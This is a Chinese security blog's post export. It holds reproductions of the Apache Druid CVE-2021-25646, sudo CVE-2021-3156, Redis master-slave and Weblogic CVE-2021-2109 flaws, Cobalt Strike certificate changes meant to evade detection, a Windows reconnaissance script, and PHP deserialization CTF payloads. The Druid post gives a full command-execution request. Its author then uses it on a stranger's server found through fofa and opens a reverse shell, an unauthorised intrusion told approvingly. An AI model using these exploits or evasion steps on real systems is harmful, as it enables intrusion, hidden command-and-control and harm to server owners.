Druid包括执行用户提供的JavaScript的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在Druid 0.20.0及更低版本中，经过身份验证的用户发送恶意请求，利用Apache Druid漏洞可以执行任意代码。攻击者可直接构造恶意请求执行任意代码，控制服务器。 影响版本Apache Druid &lt; 0.20.1 环境搭建下载apache-druid-0.20:https://archive.apache.org/dist/druid/0.20.0/apache-druid-0.20.0-bin.tar.gz 启动 123tar -xzvf apache-druid-0.20.0-bin.tar.gzcd apache-druid-0.20.0.&#x2F;bin&#x2F;start-micro-quickstart 启动后服务绑定在8888端口，浏览器可以正常访问则表示环境启动成功 漏洞复现首先查看/tmp目录下的文件 访问8888端口后，点击Load data，抓包 具体内容如下 12345678910POST &#x2F;druid&#x2F;indexer&#x2F;v1&#x2F;sampler HTTP&#x2F;1.1Host: ip:protUser-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko&#x2F;20100101 Firefox&#x2F;85.0Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Content-Type: application&#x2F;jsonContent-Length: 1045Connection: close &#123;&quot;type&quot;: &quot;index&quot;, &quot;spec&quot;: &#123;&quot;ioConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;, &quot;inputSource&quot;: &#123;&quot;type&quot;: &quot;inline&quot;, &quot;data&quot;: &quot;&#123;\\&quot;isRobot\\&quot;:true,\\&quot;channel\\&quot;:\\&quot;#x\\&quot;,\\&quot;timestamp\\&quot;:\\&quot;2020-12-12T12:10:21.040Z\\&quot;,\\&quot;flags\\&quot;:\\&quot;x\\&quot;,\\&quot;isUnpatrolled\\&quot;:false,\\&quot;page\\&quot;:\\&quot;1\\&quot;,\\&quot;diffUrl\\&quot;:\\&quot;https:&#x2F;&#x2F;xxx.com\\&quot;,\\&quot;added\\&quot;:1,\\&quot;comment\\&quot;:\\&quot;Botskapande Indonesien omdirigering\\&quot;,\\&quot;commentLength\\&quot;:35,\\&quot;isNew\\&quot;:true,\\&quot;isMinor\\&quot;:false,\\&quot;delta\\&quot;:31,\\&quot;isAnonymous\\&quot;:true,\\&quot;user\\&quot;:\\&quot;Lsjbot\\&quot;,\\&quot;deltaBucket\\&quot;:0,\\&quot;deleted\\&quot;:0,\\&quot;namespace\\&quot;:\\&quot;Main\\&quot;&#125;&quot;&#125;, &quot;inputFormat&quot;: &#123;&quot;type&quot;: &quot;json&quot;, &quot;keepNullColumns&quot;: true&#125;&#125;, &quot;dataSchema&quot;: &#123;&quot;dataSource&quot;: &quot;sample&quot;, &quot;timestampSpec&quot;: &#123;&quot;column&quot;: &quot;timestamp&quot;, &quot;format&quot;: &quot;iso&quot;&#125;, &quot;dimensionsSpec&quot;: &#123;&#125;, &quot;transformSpec&quot;: &#123;&quot;transforms&quot;: [], &quot;filter&quot;: &#123;&quot;type&quot;: &quot;javascript&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;function&quot;: &quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#39;&#x2F;bin&#x2F;bash -c $@|bash 0 ping dns.com&#39;)&#125;&quot;, &quot;&quot;: &#123;&quot;enabled&quot;: true&#125;&#125;&#125;&#125;, &quot;type&quot;: &quot;index&quot;, &quot;tuningConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;&#125;&#125;, &quot;samplerConfig&quot;: &#123;&quot;numRows&quot;: 500, &quot;timeoutMs&quot;: 15000&#125;&#125; 在/tmp目录下创建一个新的test文件夹。 攻击成功。 漏洞修复建议广大用户及时更新Apache Druid，下载链接为： https://druid.apache.org/downloads.html https://github.com/apache/druid/releases/tag/druid-0.20.1 实战环节复现完了，就开始实战，想看看还有没有人漏网之鱼。于是乎上了神器fofa就是一顿搜索， 遇到的都是这样的，load data点击不了，只好放弃。 翻着翻着，就看到一条漏网之鱼，下面还温馨的告诉运行的版本号是0.17.1，这不是刚好符合漏洞版本。 先去DNSLog看一下，是否存在漏洞。多看了几遍。。。 那就可以反弹shell了嘛。最近腾讯云搞活动，贵了，以前学生9元钱一个月，现在最低买三个月，只好用ngrok做个端口转发 运行./sunny clientid 隧道id 本地监听3333端口 1nc -lvvp 3333 看情况是个人VPS到此收工。没有什么好继续进行的了。","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[]},{"title":"Linux sudo提权(CVE-2021-3156)","slug":"Linux-sudo提权-CVE-2021-3156","date":"2021-02-02T09:25:02.000Z","updated":"2021-02-04T05:21:57.781Z","comments":true,"path":"2021/02/02/Linux-sudo提权-CVE-2021-3156/","link":"","permalink":"http://example.com/2021/02/02/Linux-sudo%E6%8F%90%E6%9D%83-CVE-2021-3156/","excerpt":"","text":"Linux sudo 权限提升(CVE-2021-3156)漏洞描述当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。因此只要存在sudoers文件（通常是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。研究人员利用该漏洞在多个Linux发行版上成功获得了完整的root权限，包括Ubuntu 20.04（sudo 1.8.31）、Debian 10（sudo 1.8.27）和Fedora 33（sudo 1.9.2），并且sudo支持的其他操作系统和Linux发行版也很容易受到攻击。 漏洞影响 sudo 1.8.2 ~ 1.8.31p2 sudo 1.9.0 ~ 1.9.5p1 检测方法以非 root 用户执行 1sudoedit -s &#x2F; 存在漏洞 不存在漏洞 漏洞复现工具：https://github.com/blasty/CVE-2021-3156 编译工具 123cd CVE-2021-3156make 使用工具 提权成功 漏洞修复修复升级到更新版本","categories":[{"name":"Linux提权","slug":"Linux提权","permalink":"http://example.com/categories/Linux%E6%8F%90%E6%9D%83/"}],"tags":[]},{"title":"CobaltStrike特征修改","slug":"CobaltStrike特征修改","date":"2021-01-31T01:03:16.000Z","updated":"2021-02-04T03:29:09.479Z","comments":true,"path":"2021/01/31/CobaltStrike特征修改/","link":"","permalink":"http://example.com/2021/01/31/CobaltStrike%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9/","excerpt":"","text":"Cobalt Strike 修改特征端口修改默认端口 1vim teamserver 将其中的server_port改成任意不冲突端口即可 证书特征查看当前证书信息 1keytool -list -v -keystore cobaltstrike.store 输入默认密码123456回车，可以看到所有者、发布者中Cobalt Strike相关字样 通过fofa直接能搜到很多cobaltstrike的vps 使用nmap扫描指定ip的证书信息 1nmap -sV --script ssl-cert &lt;target_ip&gt; 使用Keytools工具修改证书信息 12345keytool ‐keystore cobaltstrike.store ‐storepass 密码 ‐keypass 密码 ‐genkey ‐keyalg RSA ‐alias google.com ‐dname &quot;CN&#x3D;(名字与姓氏), OU&#x3D;(组织单位名称), O&#x3D;(组织名称), L&#x3D;(城市或区域名称), ST&#x3D;(州或省份名称), C&#x3D;(单位的两字母国家代码)&quot;keytool -keystore cobaltstrike.store --storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu.com -dname &quot;CN&#x3D;US, OU&#x3D;baidu.com, O&#x3D;Sofware, L&#x3D;Somewhere, ST&#x3D;Cyberspace, C&#x3D;CN&quot; 可以看到修改证书信息之后，再也没有cobaltstrike 的关键字了。 流量特征太重复了，就不多写了。贴出一个写的比较详细的 https://www.secpulse.com/archives/148377.html","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"Redis主从复制GetShell","slug":"Redis主从复制GetShell","date":"2021-01-30T02:45:13.000Z","updated":"2021-02-04T05:08:18.072Z","comments":true,"path":"2021/01/30/Redis主从复制GetShell/","link":"","permalink":"http://example.com/2021/01/30/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6GetShell/","excerpt":"Redis主从复制GetShell","text":"Redis主从复制GetShell 漏洞原因在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。 漏洞复现使用dockers下载redis5.0 1docker pull damonevking&#x2F;redis5.0 启动 1docker run -p 6379:6379 -d damonevking&#x2F;redis5.0 redis-server &#x2F;&#x2F;映射端口并运行容器 在攻击机上执行 https://github.com/Ridter/redis-rce.git https://github.com/n0b0dyCN/redis-rogue-server 下载exp.so，并复制到上一个文件加中 1python3 redis-rce.py -r 192.168.0.5 -L 192.168.0.8 -f exp.so","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"CVE-2021-2019","slug":"Weblogic CVE-2021-2109 RCE复现","date":"2021-01-24T12:57:20.000Z","updated":"2021-01-25T01:52:53.756Z","comments":true,"path":"2021/01/24/Weblogic CVE-2021-2109 RCE复现/","link":"","permalink":"http://example.com/2021/01/24/Weblogic%20CVE-2021-2109%20RCE%E5%A4%8D%E7%8E%B0/","excerpt":"Weblogic CVE-2021-2109 RCE复现Weblogic 介绍Weblogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JavaEE架构的中间件，Weblogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。","text":"Weblogic CVE-2021-2109 RCE复现Weblogic 介绍Weblogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JavaEE架构的中间件，Weblogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。 漏洞危害2021年1月20日，绿盟科技监测发现Oracle官方发布了2021年1月关键补丁更新公告CPU（Critical Patch Update），共修复了329个不同程度的漏洞，其中包括7个影响WebLogic的严重漏洞（CVE-2021-1994、CVE-2021-2047、CVE-2021-2064、CVE-2021-2108、CVE-2021-2075、CVE-2019-17195、CVE-2020-14756），未经身份验证的攻击者可通过此次的漏洞实现远程代码执行。CVSS评分均为9.8，利用复杂度低。建议用户尽快采取措施，对上述漏洞进行防护。 影响版本 WebLogic 10.3.6.0.0 WebLogic 12.1.3.0.0 WebLogic 12.2.1.3.0 WebLogic 12.2.1.4.0 WebLogic 14.1.1.0.0 环境搭建weblogic下载地址：https://www.oracle.com/middleware/technologies/fusionmiddleware-downloads.html 将下载下来的weblogic解压，以管理员身份运行 1java -jar fmw_14.1.1.0.0_wls_lite_quick_generic.jar 此时，已经安装好了，会在当前目录下生成一个文件夹wls1411。 打开目录F:\\Program_Files\\weblogic\\wls1411\\oracle_common\\common\\bin，运行config.cmd 默认下一步即可 上面配置号后，会在wls1411文件夹下生成一个新的user_projects文件夹，在其下面domains\\base_domain\\中运行startWebLogic.cmd就可以启动weblogic服务。 访问本地http://127.0.0.1:7001/console/login/LoginForm.jsp 漏洞利用利用条件：需要知道登录密码 使用的工具 JNDI-Injection-Exploit：https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar CVE-2021-2109.py：https://www.exploit-db.com/exploits/49461 漏洞修复赶紧打上补丁。","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Weblogic","slug":"Weblogic","permalink":"http://example.com/tags/Weblogic/"}]},{"title":"windows信息收集","slug":"windows信息收集","date":"2020-12-17T14:54:36.000Z","updated":"2020-12-17T14:59:10.269Z","comments":true,"path":"2020/12/17/windows信息收集/","link":"","permalink":"http://example.com/2020/12/17/windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"Windows 信息收集作为一个想偷懒的人，必然就想写个脚本对信息收集，免得自己丢三落四。然而，知道python打包的exe文件大，不知道这么大。于是只有个半成品。","text":"Windows 信息收集作为一个想偷懒的人，必然就想写个脚本对信息收集，免得自己丢三落四。然而，知道python打包的exe文件大，不知道这么大。于是只有个半成品。 python 源码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155from subprocess import Popen, PIPEfrom re import compile, sub, DOTALLclass getInformation: def __init__(self): self.hostName = None self.registerName = None self.domainWork = None self.patches = None self.allUser = None self.OnlineUser = None self.currentUser = None self.currentUserGroup = None self.AVName = None self.shareList = None self.OS = None def userOpt(self): # 获取所有用户 response = Popen(&quot;net user&quot;, shell=True, stdout=PIPE) result = response.stdout.read().decode(&#x27;gbk&#x27;) # print(result) pattern1 = r&#x27;.*?---\\r\\n(.*?)命令成功&#x27; allUsers = compile(pattern1, DOTALL) allUser = allUsers.findall(result)[0].replace(&quot;\\r\\n&quot;, &quot;&quot;) allUser = sub(&#x27; +&#x27;, &#x27; | &#x27;, allUser) # print(allUser) self.allUser = allUser # 查询当前用户 response = Popen(&quot;whoami&quot;, shell=True, stdout=PIPE) result = response.stdout.read().decode(&#x27;gbk&#x27;) pattern1 = r&#x27;.*?\\\\(.*?)\\r\\n&#x27; currentUsers = compile(pattern1, DOTALL) currentUser = currentUsers.findall(result)[0].replace(&quot;\\r\\n&quot;, &quot;&quot;).strip() self.currentUser = currentUser # 查询当前用户所属组 response = Popen(&quot;net user &quot;+self.currentUser, shell=True, stdout=PIPE) result = response.stdout.read().decode(&#x27;gbk&#x27;) pattern1 = r&#x27;.*?本地组成员 \\s+(\\*.*?)\\r\\n&#x27; currentUserGroups = compile(pattern1, DOTALL) currentUserGroup = currentUserGroups.findall(result)[0].replace(&quot;\\r\\n&quot;, &quot;&quot;).strip() self.currentUserGroup = currentUserGroup # 查询在线用户 response = Popen(&quot;query user | quser&quot;, shell=True, stdout=PIPE) result = response.stdout.read().decode(&#x27;gbk&#x27;) pattern1 = r&#x27;.*?&gt;(.*?) &#x27; OnlineUsers = compile(pattern1, DOTALL) OnlineUser = OnlineUsers.findall(result)[0].replace(&quot;\\r\\n&quot;, &quot;&quot;).strip() self.OnlineUser = OnlineUser def SystemInfo(self): response = Popen(&quot;systeminfo&quot;, shell=True, stdout=PIPE) result = response.stdout.read().decode(&#x27;gbk&#x27;) # 获取主机名 pattern1 = r&#x27;.*?主机名:\\s+(.*?)\\r\\n&#x27; hostNames = compile(pattern1, DOTALL) hostName = hostNames.findall(result) self.hostName = hostName[0].strip() # 获取用户名 pattern2 = r&#x27;.*?注册的所有人: (.*?)\\r\\n&#x27; registerNames = compile(pattern2, DOTALL) registerName = registerNames.findall(result) self.registerName = registerName[0].strip() # 获取工作组名或域名 pattern3 = r&#x27;.*?域:\\s+(.*?)\\r\\n&#x27; domainWorks = compile(pattern3, DOTALL) domainWork = domainWorks.findall(result) self.domainWork = domainWork[0].strip() # 获取补丁信息 pattern4 = r&#x27;.*?\\[\\d+\\]: (KB\\d&#123;7&#125;)\\r\\n&#x27; patches = compile(pattern4, DOTALL) patchName = patches.findall(result) self.patches = patchName # 获取OS名称和版本 pattern5 = r&#x27;.*?OS 名称:\\s+ (.*?)\\r\\nOS&#x27; OS = compile(pattern5, DOTALL) OSName = OS.findall(result)[0] pattern6 = r&#x27;.*?OS 版本:\\s+ (.*?)\\r\\nOS&#x27; OSVersion = compile(pattern6, DOTALL) OSVersion = OSVersion.findall(result)[0] # print(OSName + &quot; &quot; + OSVersion) self.OS = OSName + &quot; &quot; + OSVersion # self.OS = OS def AntiVirusList(self): # 获取杀软名称 response = Popen(&quot;wmic /namespace:\\\\\\\\root\\\\securitycenter2 path antivirusproduct GET displayName&quot;, shell=True, stdout=PIPE) result = response.stdout.read().decode(&#x27;gbk&#x27;) AVs = result.split(&#x27;\\r\\r\\n&#x27;) AVs = set([item.strip() for item in AVs[1:-2]]) self.AVName = AVs def NetShare(self): # 获取共享资源 response = Popen(&quot;net share&quot;, shell=True, stdout=PIPE) result = response.stdout.read().decode(&#x27;gbk&#x27;) pattern = r&#x27;.*?---\\r\\n(.*?)\\r\\n命令&#x27; shareList = compile(pattern, DOTALL) shareList = shareList.findall(result)[0] shareList = &#x27; &#x27;.join(shareList.split()) self.shareList = shareList def runCommand(self): self.NetShare() self.AntiVirusList() self.userOpt() self.SystemInfo() def printInfo(self): print(&quot;\\n\\n&quot;) print(&quot;[*]系统信息:&quot;.ljust(15), self.OS) print(&quot;[-]&quot;,&quot;-&quot;*100) print(&quot;[*]当前主机名:&quot;.ljust(15), self.hostName) print(&quot;[-]&quot;,&quot;-&quot;*100) print(&quot;[*]域/工作组:&quot;.ljust(15), self.domainWork) print(&quot;[-]&quot;,&quot;-&quot;*100) print(&quot;[*]当前注册人:&quot;.ljust(15), self.registerName) print(&quot;[-]&quot;,&quot;-&quot;*100) print(&quot;[*]当前用户名:&quot;.ljust(15), self.currentUser) print(&quot;[-]&quot;,&quot;-&quot;*100) print(&quot;[*]当前用户属组:&quot;.ljust(15), self.currentUserGroup) print(&quot;[-]&quot;,&quot;-&quot;*100) print(&quot;[*]所有用户名:&quot;.ljust(15), self.allUser) print(&quot;[-]&quot;,&quot;-&quot;*100) print(&quot;[*]在线用户:&quot;.ljust(15), self.OnlineUser) print(&quot;[-]&quot;,&quot;-&quot;*100) print(&quot;[*]补丁安装情况:&quot;.ljust(15), self.patches) print(&quot;[-]\\n[-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;复制补丁信息到网站查询可用exp：http://bugs.hacking8.com/tiquan/&quot;) print(&quot;[-]&quot;,&quot;-&quot;*100) print(&quot;[*]杀软程序:&quot;.ljust(15), self.AVName) print(&quot;[-]&quot;,&quot;-&quot;*100) print(&quot;[*]共享资源:&quot;.ljust(15), self.shareList)info = getInformation()info.runCommand()info.printInfo() 文件大小6KB，打包后约为6M。脑瓜子又嗡嗡的。","categories":[],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"PHP反序列化总结","slug":"PHP反序列化总结","date":"2020-11-12T00:01:45.000Z","updated":"2020-11-12T00:04:37.398Z","comments":true,"path":"2020/11/12/PHP反序列化总结/","link":"","permalink":"http://example.com/2020/11/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/","excerpt":"PHP反序列化漏洞PHP序列化与反序列化意义在开发的过程中常常遇到需要把对象或者数组进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到mysql数据库中时，我们时常需要将数组进行序列号操作。 序列化（串行化）：是将变量转换为可保存或传输的字符串的过程； 反序列化（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。 这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。 常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。","text":"PHP反序列化漏洞PHP序列化与反序列化意义在开发的过程中常常遇到需要把对象或者数组进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到mysql数据库中时，我们时常需要将数组进行序列号操作。 序列化（串行化）：是将变量转换为可保存或传输的字符串的过程； 反序列化（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。 这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。 常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。 PHP序列化与反序列化入门首先定义了一个类，其中包含两个共有变量name和pass。 序列化成了一长串字符串。其中O代表对象，4代表长度，come表示对象的名字，2表示对象有两个成员。括号里面就是描述这些成员。s表示是字符串，4表示该字符串中有4个字符。先尝试输出$name和pass 我对php反序列化漏洞的理解就是：新建了一个对象，并修改其中的成员变量，利用对象中的函数执行我们想让其执行的命令。我认为可以将其理解为SQL注入，注入的参数由攻击者任意设计，但是其中的过滤函数我们没办法修改，这里的成员函数就类似于sql注入中的过滤函数，只能使劲的想办法绕过，或者在php反序列化中使劲的利用这些函数进行命令等执行。 例如想让getInfo输出一些其他的东西。 12345678910111213&lt;?php class come&#123; public $name=&quot;Rainbow&quot;; public $pass=&quot;123456&quot;; public function getInfo()&#123; echo &#x27;Username: &#x27; . $this-&gt;name . &quot; Password: &quot; . $this-&gt;pass; &#125; &#125; $come1 = new come(); echo $come1-&gt;getInfo().&#x27;&lt;br /&gt;&#x27;; unserialize($_GET[&#x27;come&#x27;])-&gt;getInfo(); echo $come1-&gt;getInfo().&#x27;&lt;br /&gt;&#x27;;?&gt; 可以看到，Username和Password的值已经变了，其实就是新建了一个对象，然后调用come对象里面的getInfo函数输出 。 上面只是一个public的案例，接下来再看看成员变量是private时候的情况。private修饰的成员变量在序列化时会产生一个从%00经过urldecode解码后的符号来显出他的特殊。说起来绕口，直接上图片： 显示不出来的，就是%00经过url解码后的符号。相应的protected修饰的成员变量序列化的情况如下： protected使用的前缀为%00*%00 对成员变量进行修饰。 PHP类的魔术方法魔术方法就是在序列化或者反序列化的时候，程序会”情不自禁”的去调用这些函数。常见的有下面5个 __construct 当一个对象创建时被调用 __destruct 当一个对象销毁时被调用 __toString 当一个对象被当作一个字符串使用 __sleep 在对象被序列化之前运行 __wakeup 在对象被反序列化之后被调用 __call():当要调用的方法不存在或权限不足时自动调用 __invoke():当把一个类当作函数使用时自动调用 拿网上最好的例子： 12345678910111213141516171819202122232425262728293031323334&lt;?php class Test&#123; public function __construct()&#123; echo &#x27;construct run&#x27;; &#125; public function __destruct()&#123; echo &#x27;destruct run&#x27;; &#125; public function __toString()&#123; echo &#x27;toString run&#x27;; return &#x27;qwe&#x27;; &#125; public function __sleep()&#123; echo &#x27;sleep run&#x27;; &#125; public function __wakeup()&#123; echo &#x27;wakeup run&#x27;; &#125;&#125; $test= new Test(); // 创建对象的时候运行 construct echo &#x27;&lt;br /&gt;&#x27;; $sTest= serialize($test); // 序列化的时候先调用 sleep echo &#x27;&lt;br /&gt;&#x27;; $usTest= unserialize($sTest); // 反序列先调用__wakeup函数 echo &#x27;&lt;br /&gt;&#x27;; $string= &#x27;hello class &#x27; . $test; // 调用toString函数 echo &#x27;&lt;br /&gt;&#x27;; //整个结束调用destruct函数?&gt; 案例关卡一12345678910&lt;?php error_reporting(0); $KEY = &quot;D0g3!!!&quot;; $str = $_GET[&#x27;str&#x27;]; if (unserialize($str) === &quot;$KEY&quot;) &#123; echo &quot;success&quot;; &#125; show_source(__FILE__);?&gt; 可以看到如果反序列化$_GET&#123;&#39;str&#39;]之后的内容为D0g3!!!，那么就能成功。那就简单了，逆向考虑，$str=serialize($KEY)即可 关卡二123456789101112131415161718192021222324252627&lt;?php class SoFun&#123; protected $file=&#x27;index.php&#x27;; function __destruct()&#123; if(!empty($this-&gt;file)) &#123; if(strchr($this-&gt; file,&quot;\\\\&quot;)===false &amp;&amp; strchr($this-&gt;file, &#x27;/&#x27;)===false) show_source(dirname (__FILE__).&#x27;/&#x27;.$this -&gt;file); else die(&#x27;Wrong filename.&#x27;); &#125; &#125; function __wakeup()&#123; $this-&gt; file=&#x27;index.php&#x27;; &#125; public function __toString()&#123; return &#x27;&#x27; ; &#125; &#125; if (!isset($_GET[&#x27;file&#x27;]))&#123; show_source(&#x27;index.php&#x27;); &#125; else&#123; $file=base64_decode( $_GET[&#x27;file&#x27;]); echo unserialize($file ); &#125; ?&gt; &lt;!--key in flag.php--&gt; 这里通过$_GET[&#39;file&#39;]获取然后base64解码，然后再执行反序列化。然后看下漏洞怎么利用，反序列化会首先调用wakeup函数，在这里，会直接把文件名直接给替换成index.php，然后才会show源码。既然不能改变$file的值，那么只有绕过这个函数了。 构造payload如下： 12345O:5:&quot;SoFun&quot;:1:&#123;s:7:&quot;%00*%00file&quot;;s:8:&quot;flag.php&quot;;&#125; 这是正常构造的payload，但是这个payload会经过wakeup函数但是要想绕过wakeup，需要修改到下面这种形式O:5:&quot;SoFun&quot;:2:&#123;s:7:&quot;%00*%00file&quot;;s:8:&quot;flag.php&quot;;&#125; 这里就能绕过wakeup函数，将成员函数的变量设置成比实际成员变量大，就能绕过 绕过具体可以参考https://www.cnblogs.com/zy-king-karl/p/11436872.html 关卡三来源：https://bbs.ichunqiu.com/thread-45290-1-1.html?from=aqzx4 一串连环套的调用案例，源码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpclass start_gg&#123; public $mod1; public $mod2; public function __destruct()&#123; $this-&gt;mod1-&gt;test1(); &#125;&#125;class Call&#123; public $mod1; public $mod2; public function test1()&#123; $this-&gt;mod1-&gt;test2(); &#125;&#125;class funct&#123; public $mod1; public $mod2; public function __call($test2,$arr)&#123; $s1 = $this-&gt;mod1; $s1(); &#125;&#125;class func&#123; public $mod1; public $mod2; public function __invoke()&#123; $this-&gt;mod2 = &quot;`字符串拼接`&quot;.$this-&gt;mod1; &#125;&#125;class string1&#123; public $str1; public $str2; public function __toString() &#123; $this-&gt;str1-&gt;get_flag(); return &quot;1&quot;; &#125;&#125;class GetFlag&#123; public function get_flag()&#123; echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;; &#125;&#125;$a = $_GET[&#x27;string&#x27;];unserialize($a);?&gt; 那只有倒退了。要想获取flag，就要调用get_flag函数，要想调用get_flag函数，就需要掉i用__toString方法，而这个方法只在被当作字符串输出的时候才会被调用，有输出的就是func类里面的invoke函数，而invoke函数只有把类当作函数使用的时候才会被调用，然后又看到funct对象，而call只有调用方法不存在的情况下被调用，再看到Call，里面调用了一个不知道的函数，然后就追溯到destruct函数。构造payload： 在每个函数里面添加一个 construct初始化函数，并指向下一个函数。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phpclass start_gg&#123; public $mod1; public $mod2; function __construct()&#123; $this-&gt;mod1 = new Call(); &#125; public function __destruct()&#123; $this-&gt;mod1-&gt;test1(); &#125;&#125;class Call&#123; public $mod1; public $mod2; function __construct()&#123; $this-&gt;mod1 = new funct(); &#125; public function test1()&#123; $this-&gt;mod1-&gt;test2(); &#125;&#125;class funct&#123; public $mod1; public $mod2; function __construct()&#123; $this-&gt;mod1 = new func(); &#125; public function __call($test2,$arr)&#123; $s1 = $this-&gt;mod1; $s1(); &#125;&#125;class func&#123; public $mod1; public $mod2; function __construct()&#123; $this-&gt;mod1 = new string1(); &#125; public function __invoke()&#123; $this-&gt;mod2 = &quot;`字符串拼接`&quot;.$this-&gt;mod1; &#125;&#125;class string1&#123; public $str1; public $str2; function __construct()&#123; $this-&gt;str1 = new GetFlag(); &#125; public function __toString() &#123; $this-&gt;str1-&gt;get_flag(); return &quot;1&quot;; &#125;&#125;class GetFlag&#123; public function get_flag()&#123; echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;; &#125;&#125;echo serialize(new start_gg());?&gt; 生成的payload如下 1O:8:&quot;start_gg&quot;:2:&#123;s:4:&quot;mod1&quot;;O:4:&quot;Call&quot;:2:&#123;s:4:&quot;mod1&quot;;O:5:&quot;funct&quot;:2:&#123;s:4:&quot;mod1&quot;;O:4:&quot;func&quot;:2:&#123;s:4:&quot;mod1&quot;;O:7:&quot;string1&quot;:2:&#123;s:4:&quot;str1&quot;;O:7:&quot;GetFlag&quot;:0:&#123;&#125;s:4:&quot;str2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;","categories":[],"tags":[{"name":"PHP反序列化","slug":"PHP反序列化","permalink":"http://example.com/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"PHP反序列化入门","slug":"PHP反序列化入门","date":"2020-11-09T01:50:53.000Z","updated":"2020-11-09T01:51:47.709Z","comments":true,"path":"2020/11/09/PHP反序列化入门/","link":"","permalink":"http://example.com/2020/11/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/","excerpt":"PHP反序列化漏洞PHP序列化与反序列化意义在开发的过程中常常遇到需要把对象或者数组进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到mysql数据库中时，我们时常需要将数组进行序列号操作。 序列化（串行化）：是将变量转换为可保存或传输的字符串的过程； 反序列化（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。 这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。 常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。","text":"PHP反序列化漏洞PHP序列化与反序列化意义在开发的过程中常常遇到需要把对象或者数组进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到mysql数据库中时，我们时常需要将数组进行序列号操作。 序列化（串行化）：是将变量转换为可保存或传输的字符串的过程； 反序列化（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。 这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。 常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。 PHP序列化与反序列化入门首先定义了一个类，其中包含两个共有变量name和pass。 序列化成了一长串字符串。其中O代表对象，4代表长度，come表示对象的名字，2表示对象有两个成员。括号里面就是描述这些成员。s表示是字符串，4表示该字符串中有4个字符。先尝试输出$name和pass 我对php反序列化漏洞的理解就是：新建了一个对象，并修改其中的成员变量，利用对象中的函数执行我们想让其执行的命令。我认为可以将其理解为SQL注入，注入的参数由攻击者任意设计，但是其中的过滤函数我们没办法修改，这里的成员函数就类似于sql注入中的过滤函数，只能使劲的想办法绕过，或者在php反序列化中使劲的利用这些函数进行命令等执行。 